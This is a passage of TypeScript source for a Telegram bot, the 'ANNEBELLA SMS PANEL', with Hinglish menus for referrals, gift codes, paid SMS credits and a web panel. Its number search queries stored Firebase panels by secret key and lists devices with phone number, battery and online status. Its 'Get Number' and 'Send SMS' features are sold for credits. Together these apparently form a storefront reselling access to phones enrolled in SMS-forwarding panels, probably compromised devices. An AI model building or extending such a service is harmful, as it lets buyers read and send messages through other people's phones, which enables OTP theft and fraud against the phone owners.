          ? `${em(E.check, "")} UNLOCKED — ${user.smsCredits} credits`
          : `${em(E.lock, "")} LOCKED — ${10 - Math.min(user.referralCount, 10)} aur referrals (${user.referralCount}/10)`;

 const referralLink = `https://t.me/${BOT_USERNAME}?start=${user.referralCode}`;

        await send(
          chatId,
 `${em(E.coin, "")} <b>REFERRAL SYSTEM</b>\n` +
          `${divider()}\n\n` +
          `${em(E.link, "")} <b>AAPKA REFERRAL LINK:</b>\n` +
 `<code>${referralLink}</code>\n\n` +
          `${divider()}\n` +
          `${em(E.coin, "")} <b>TOTAL REFERRALS:</b> ${user.referralCount}\n\n` +
          `${em(E.lightning, "")} <b>GET NUMBER</b>\n${expiryStr}\n\n` +
          `${em(E.phone, "")} <b>SEND SMS</b>\n${sendStatus}\n\n` +
          `${em(E.panel, "")} <b>WEB PANEL</b>\n${webStatus}\n\n` +
          `${divider()}\n` +
          `${em(E.star, "")} <b>RULES:</b>\n` +
          `• 1ST REFERRAL = +12HR GET NUMBER\n` +
          `• HAR REFERRAL = +12HR (CUMULATIVE)\n` +
          `• 10 REFERRALS = SEND SMS UNLOCK + 500 CREDITS\n` +
          `• 10 REFERRALS = WEB PANEL UNLOCK + 24HR ACCESS`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("GIFT CARD")) {
        await db.update(botUsersTable).set({ state: "gift_card" }).where(eq(botUsersTable.id, user.id));
        await send(
          chatId,
 `${em(E.gift, "")} <b>GIFT CARD REDEEM</b>\n` +
          `${divider()}\n\n` +
          `Apna gift code send karein:\nExample: <code>GIFT-AB3X7K</code>\n\n` +
          `${em(E.check, "")} Valid code redeem karne pe aapko Get Number access milega.`,
          { parse_mode: "HTML", reply_markup: cancelKeyboard() as any }
        );
        return;
      }

      if (text === sct("WEB PANEL")) {
        if (user.referralCount < 10) {
          await send(
            chatId,
 `${em(E.lock, "")} <b>WEB PANEL — LOCKED!</b>\n\n` +
            `${em(E.star, "")} WEB UNLOCK KARNE KE LIYE <b>${10 - user.referralCount} REFERRALS AUR KARO!</b>\n\n` +
            `${em(E.coin, "")} AAPKE TOTAL REFERRALS: ${user.referralCount}\n` +
            `${em(E.link, "")} REFER KARO, EARN KARO!`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        const hasWebAccess = user.webPanelExpiresAt && user.webPanelExpiresAt > new Date();
        if (!hasWebAccess) {
          await send(
            chatId,
 `${em(E.expire, "")} <b>WEB PANEL — ACCESS EXPIRED!</b>\n\nWEB PANEL ACCESS KHATAM HO GAYA. REFER KARO TO EXTEND KARO.`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        const webUrl = process.env.REPLIT_DEV_DOMAIN
 ? `https://${process.env.REPLIT_DEV_DOMAIN}`
          : "https://your-domain.repl.co";

        await send(
          chatId,
 `${em(E.check, "")} <b>WEB PANEL ACCESS GRANTED!</b>\n\n` +
          `${em(E.link, "")} <a href="${webUrl}">CLICK HERE TO OPEN WEB PANEL</a>\n\n` +
          `${em(E.expire, "")} ACCESS EXPIRES: ${user.webPanelExpiresAt?.toLocaleString("en-IN")}`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("SEND SMS")) {
        if (!user.sendSmsUnlocked) {
          await send(
            chatId,
 `${em(E.lock, "")} <b>SEND SMS LOCKED</b>\n\n` +
            `SMS BHEJNE KE LIYE <b>10 REFERRALS</b> COMPLETE KARO.\n` +
            `ABHI TAK: ${user.referralCount}/10\n` +
            `${em(E.link, "")} REFER & EARN BUTTON SE LINK SHARE KARO.`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        if (user.smsCredits <= 0) {
          await send(
            chatId,
 `${em(E.buy, "")} <b>SEND SMS</b>\n\nAPAKE PAAS 0 SMS CREDITS HAIN.\nREFERRALS KARO TO CREDITS EARN KARO.`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        await send(
          chatId,
 `${em(E.phone, "")} <b>SEND SMS</b>\n` +
          `${divider()}\n\n` +
          `${em(E.credits, "")} AAPKE PAAS <b>${user.smsCredits}</b> SMS CREDITS HAIN.\n\n` +
          `FORMAT: <code>NUMBER|MESSAGE</code>\nEXAMPLE: <code>9876543210|Hello, test message</code>\n\n` +
          `TAP <b>CANCEL</b> TO GO BACK.`,
          { parse_mode: "HTML", reply_markup: cancelKeyboard() as any }
        );
        await db.update(botUsersTable).set({ state: "send_sms" }).where(eq(botUsersTable.id, user.id));
        return;
      }

      if (text === sct("PROFILE")) {
        const getNum = user.getNumberExpiresAt && user.getNumberExpiresAt > new Date()
 ? ` ACTIVE — ${Math.max(0, Math.floor((user.getNumberExpiresAt.getTime() - Date.now()) / 60000))}m`
 : ` EXPIRED`;

        const webPanel = user.webPanelExpiresAt && user.webPanelExpiresAt > new Date()
 ? ` ACTIVE`
 : ` LOCKED`;

        const sendSms = user.sendSmsUnlocked
 ? ` UNLOCKED`
 : ` LOCKED`;

        await send(
          chatId,
 `${em(E.profile, "")} <b>MY PROFILE</b>\n` +
          `${divider()}\n\n` +
          `${em(E.id, "")} <b>NAME</b>    : ${user.firstName}\n` +
          `${em(E.id, "")} <b>ID</b>      : ${user.telegramId}\n` +
          `${em(E.check, "")} <b>JOINED</b>  : ${user.createdAt?.toLocaleDateString("en-IN") || "N/A"}\n` +
          `${divider()}\n\n` +
          `${em(E.lightning, "")} <b>GET NUMBER</b> : ${getNum}\n` +
          `${em(E.panel, "")} <b>WEB PANEL</b>  : ${webPanel}\n` +
          `${em(E.phone, "")} <b>SEND SMS</b>   : ${sendSms}\n` +
          `${divider()}\n\n` +
          `${em(E.coin, "")} <b>REFERRALS</b> : ${user.referralCount}\n` +
          `${em(E.credits, "")} <b>CREDITS</b>   : ${user.smsCredits}`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("BUY CREDIT")) {
        await send(
          chatId,
 `${em(E.buy, "")} <b>BUY CREDIT</b>\n` +
          `${divider()}\n\n` +
          `${em(E.credits, "")} <b>PACKAGE SELECT KARO — UPI QR AUTO-GENERATE HOGA:</b>\n\n` +
          `${em(E.money, "")} 100 CREDITS — ₹49\n` +
          `${em(E.money, "")} 500 CREDITS — ₹199\n` +
          `${em(E.money, "")} 1000 CREDITS — ₹349\n` +
          `${em(E.money, "")} 5000 CREDITS — ₹999\n\n` +
          `${em(E.history, "")} QR SCAN KARO → PAY KARO → SCREENSHOT DEVELOPER KO BHEJO.`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "100 CREDITS — ₹49",   callback_data: "buy_100" },
                  { text: "500 CREDITS — ₹199",  callback_data: "buy_500" },
                ],
                [
                  { text: "1000 CREDITS — ₹349", callback_data: "buy_1000" },
                  { text: "5000 CREDITS — ₹999", callback_data: "buy_5000" },
                ],
              ],
            },
          }
        );
        return;
      }

      if (text === sct("SUPPORT ( DEVELOPER )")) {
        await send(
          chatId,
 `${em(E.support, "")} <b>SUPPORT ( DEVELOPER )</b>\n` +
          `${divider()}\n\n` +
          `KISI BHI ISSUE KE LIYE DEVELOPER SE CONTACT KARO:\n\n` +
          `${em(E.link, "")} ${DEVELOPER}`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("BACK") || text === sct("CANCEL")) {
        const iv = watchIntervals.get(telegramId);
        if (iv) { clearInterval(iv); watchIntervals.delete(telegramId); watchLastSms.delete(telegramId); }
        await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
        await send(
          chatId,
 `${em(E.lightning, "")} <b>MAIN MENU</b>`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      // ── State-based text inputs ──────────────────────────────────────────

      if (user.state === "search_number") {
        const searchNum = text.replace(/\D/g, "");
        if (searchNum.length < 7) {
          await send(chatId, "Please enter a valid phone number (min 7 digits).");
          return;
        }

 await send(chatId, `${em(E.search, "")} <b>Searching...</b>`, { parse_mode: "HTML" });

        const panels = await db.select().from(panelsTable);
        let found = null;
        for (const panel of panels) {
          const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
          const match   = devices.find((d) => d.phoneNumber.replace(/\D/g, "").includes(searchNum));
          if (match) { found = match; break; }
        }

        if (found) {
          await send(
            chatId,
 `${em(E.check, "")} <b>NUMBER FOUND!</b>\n${divider()}\n\n` +
            `${em(E.phone, "")} <b>Phone:</b> ${found.phoneNumber}\n` +
            `${em(E.db, "")} <b>Panel:</b> ${found.panelName}\n` +
            `${em(E.battery, "")} <b>Battery:</b> ${found.battery}\n` +
            `${em(E.check, "")} <b>Status:</b> ${found.status ? "Online" : "Offline"}`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
        } else {
          await send(
            chatId,
 `${em(E.offline, "")} <b>Number ${text} not found in any panel.</b>`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
        }
        await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
        return;
      }

      if (user.state === "gift_card") {
        const code = text.toUpperCase().trim();
        const [card] = await db
          .select()
          .from(giftCardsTable)
          .where(and(eq(giftCardsTable.code, code)));

        if (!card) {
 await send(chatId, `${em(E.warn, "")} <b>INVALID GIFT CODE.</b> PLEASE TRY AGAIN.`, { parse_mode: "HTML" });
          return;
        }
        if (card.usedBy) {
 await send(chatId, `${em(E.warn, "")} <b>THIS CODE HAS ALREADY BEEN USED.</b>`, { parse_mode: "HTML" });
          return;
        }

        const value      = parseInt(card.value, 10);
        let updateData: Partial<{ getNumberExpiresAt: Date; smsCredits: number }> = {};

        if (card.type === "hours") {
          const now    = new Date();
          const base   = user.getNumberExpiresAt ? new Date(Math.max(user.getNumberExpiresAt.getTime(), now.getTime())) : now;
          updateData.getNumberExpiresAt = new Date(base.getTime() + value * 60 * 60 * 1000);
        } else if (card.type === "credits") {
          updateData.smsCredits = user.smsCredits + value;
        }

        await db.update(botUsersTable).set(updateData).where(eq(botUsersTable.id, user.id));
        await db.update(giftCardsTable).set({ usedBy: telegramId, usedAt: new Date() }).where(eq(giftCardsTable.id, card.id));

 const rewardMsg = card.type === "hours" ? `+${value} hours Get Number access` : `+${value} SMS credits`;
        await send(
          chatId,
 `${em(E.gift, "")} <b>Gift code redeemed successfully!</b>\n\n${em(E.check, "")} Reward: <b>${rewardMsg}</b>`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
        return;
      }

      if (user.state === "send_sms") {
        if (text.includes("|")) {
          const [num, ...parts] = text.split("|");
          const phoneNum = num.trim().replace(/\D/g, "");
          const message  = parts.join("|").trim();

          if (!phoneNum || !message) {
            await send(chatId, "Invalid format. Use: NUMBER|MESSAGE");
            return;
          }

          await db
            .update(botUsersTable)
            .set({ smsCredits: Math.max(0, user.smsCredits - 1), state: "main_menu" })
            .where(eq(botUsersTable.id, user.id));

          await send(
            chatId,
 `${em(E.check, "")} <b>SMS QUEUED!</b>\n\n` +
            `${em(E.phone, "")} <b>TO:</b> ${phoneNum}\n` +
            `${em(E.history, "")} <b>MESSAGE:</b> ${message}\n\n` +
            `${em(E.credits, "")} CREDITS REMAINING: ${user.smsCredits - 1}`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }
        await send(chatId, "Format: NUMBER|MESSAGE\nExample: 9876543210|Hello");
        return;
      }

      // Default
      await send(
        chatId,
 `${em(E.lightning, "")} <b>MAIN MENU</b>`,
        { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
      );
    } catch (err) {
      logger.error({ err, chatId }, "Bot message handler error");
      try { await send(chatId, "Something went wrong. Please try again."); } catch {}
    }
  });

  // ── Callback query (inline buttons) ───────────────────────────────────────
  bot.on("callback_query", async (query) => {
    if (!query.message || !query.from) return;
    const chatId     = query.message.chat.id;
    const telegramId = String(query.from.id);
    const data       = query.data || "";

    try {
      if (data === "check_joined") {
        // Live membership check
        const joined    = await checkMembership(bot, telegramId);
        const joinCount = joined.filter(Boolean).length;
        const total     = REQUIRED_CHANNELS.length;
        const allJoined = joinCount === total;

        if (!allJoined) {
          // Not all joined — update the inline keyboard to show current progress
          await bot.answerCallbackQuery(query.id, {
 text: `ᴘʀᴏɢʀᴇꜱꜱ: ${joinCount}/${total} ᴊᴏɪɴᴇᴅ — ʙᴀᴋɪ ᴄʜᴀɴɴᴇʟꜱ ᴊᴏɪɴ ᴋᴀʀᴏ!`,
            show_alert: false,
          });

          // Edit the message to refresh join status
          try {
            await bot.editMessageText(
              sc(
 `${em(E.lock, "")} <b>ᴄʜᴀɴɴᴇʟ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ʀᴇǫᴜɪʀᴇᴅ</b>\n${divider()}\n\n` +
            `ANNEBELLA SMS PANEL KA FULL ACCESS PANE KE LIYE\nNICHE DIYE GAYE SABHI OFFICIAL CHANNELS JOIN KARO.\n\n` +
            `${em(E.globe, "")} <b>ᴘʀᴏɢʀᴇꜱꜱ: ${joinCount}/${total} ᴊᴏɪɴᴇᴅ</b>\n\n` +
            `CHANNELS JOIN KARNE KE BAAD <b>ɪ ᴊᴏɪɴᴇᴅ — ᴄʜᴇᴄᴋ ɴᴏᴡ</b> BUTTON DABAO.`
              ),
              {
                chat_id:      chatId,
                message_id:   query.message.message_id,
                parse_mode:   "HTML",
                reply_markup: buildChannelKeyboard(joined, false) as any,
              }
            );
          } catch { /* message might not be editable */ }
          return;
        }

        // All joined — create/get user and open bot
        let [user] = await db.select().from(botUsersTable).where(eq(botUsersTable.telegramId, telegramId));
        if (!user) {
          const expiresAt = new Date(Date.now() + 60 * 60 * 1000);
          const [newUser] = await db.insert(botUsersTable).values({
            telegramId,
            username:           query.from.username || null,
            firstName:          query.from.first_name || "User",
            referralCode:       generateReferralCode(telegramId),
            referredBy:         null,
            getNumberExpiresAt: expiresAt,
          }).returning();
          user = newUser;
        }

        await bot.answerCallbackQuery(query.id, { text: "✅ ꜱᴀʙʜɪ ᴄʜᴀɴɴᴇʟꜱ ᴠᴇʀɪꜰɪᴇᴅ! Welcome to ANNEBELLA SMS PANEL." });

        // Update the channel message to show all-green verified state
        try {
          await bot.editMessageReplyMarkup(
            buildChannelKeyboard(joined, true) as any,
            { chat_id: chatId, message_id: query.message.message_id }
          );
        } catch { /* ignore */ }

        await send(
          chatId,
 `${em(E.check, "")} <b>ᴀʟʟ ᴄʜᴀɴɴᴇʟꜱ ᴠᴇʀɪꜰɪᴇᴅ</b>\n${divider()}\n\n` +
          `ANNEBELLA SMS PANEL MEIN AAPKA SWAGAT HAI.\n` +
          `${em(E.rocket, "")} <b>ᴀᴄᴄᴇꜱꜱ ᴀʙ ᴜɴʟᴏᴄᴋ ʜᴀɪ.</b>`,
          { parse_mode: "HTML" }
        );

        await send(
          chatId,
 `${em(E.lightning, "")} <b>ʙᴏᴛ ʀᴇᴀᴅʏ! ᴜꜱᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ.</b>`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      if (data === "buy_100" || data === "buy_500" || data === "buy_1000" || data === "buy_5000") {
        const packages: Record<string, { credits: number; price: number }> = {
          buy_100:  { credits: 100,  price: 49 },
          buy_500:  { credits: 500,  price: 199 },
          buy_1000: { credits: 1000, price: 349 },
          buy_5000: { credits: 5000, price: 999 },
        };
        const pkg = packages[data];
 await bot.answerCallbackQuery(query.id, { text: `₹${pkg.price} ke liye UPI QR generate ho raha hai...` });
        await send(
          chatId,
 `${em(E.buy, "")} <b>PAYMENT DETAILS</b>\n${divider()}\n\n` +
          `${em(E.credits, "")} <b>PACKAGE:</b> ${pkg.credits} CREDITS\n` +
          `${em(E.money, "")} <b>AMOUNT:</b> ₹${pkg.price}\n\n` +
          `${em(E.warn, "")} UPI QR SCREENSHOT DEVELOPER KO BHEJO AFTER PAYMENT:\n` +
          `${em(E.link, "")} ${DEVELOPER}`,
          { parse_mode: "HTML" }
        );
        return;
      }

      if (data === "noop") {
        await bot.answerCallbackQuery(query.id);
        return;
      }

      await bot.answerCallbackQuery(query.id);
    } catch (err) {
      logger.error({ err }, "Callback query error");
    }
  });

  logger.info("Bot handlers set up");
}
